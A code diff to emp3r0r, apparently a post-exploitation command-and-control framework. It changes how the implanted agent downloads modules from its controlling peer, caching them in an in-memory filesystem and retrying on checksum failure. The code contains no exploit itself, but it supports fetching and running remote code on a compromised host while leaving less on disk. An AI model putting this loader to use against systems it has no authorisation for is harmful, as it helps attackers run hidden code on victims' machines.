@@ -2,7 +2,6 @@ package modules
 
 import (
 	"fmt"
-	"os"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
@@ -70,25 +69,24 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 }
 
 func downloadAndVerifyModule(file_to_download, checksum, peerIP string) (data []byte, err error) {
+	// Modules are cached in memfs under their basename (e.g. mem:///sa_whoami).
+	// FetchFile already checks the memfs cache as tier-1, so we just call it.
+	// On success, cache is populated automatically for future calls.
 	for retry := 0; retry < 3; retry++ {
-		if crypto.SHA256SumFile(file_to_download) != checksum {
-			if data, err = fetchFile(common.RuntimeConfig, peerIP, file_to_download, "", checksum); err != nil {
-				return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
-			}
-		} else {
-			// checksum already matches local file; read it so callers can run in-memory flows
-			if data, err = util.ReadFileAgent(file_to_download); err != nil {
-				return nil, fmt.Errorf("reading %s: %v", file_to_download, err)
-			}
+		data, err = fetchFile(common.RuntimeConfig, peerIP, file_to_download, "", checksum)
+		if err != nil {
+			logging.Print(fmt.Sprintf("downloadAndVerifyModule attempt %d/3 for %s: %v", retry+1, file_to_download, err))
+			util.TakeABlink()
+			continue
 		}
-
 		if crypto.SHA256SumRaw(data) == checksum {
 			return data, nil
 		}
-
 		logging.Print(fmt.Sprintf("Checksum failed, restarting... (attempt %d/3)", retry+1))
 		util.TakeABlink()
-		os.RemoveAll(file_to_download)
+		// Evict bad entry from memfs so next attempt re-fetches
+		memKey := c2transport.MemFSKey(file_to_download)
+		_ = util.RemoveFileAgent(memKey)
 	}
 
 	return nil, fmt.Errorf("downloading %s: checksum verification failed after 3 attempts", file_to_download)
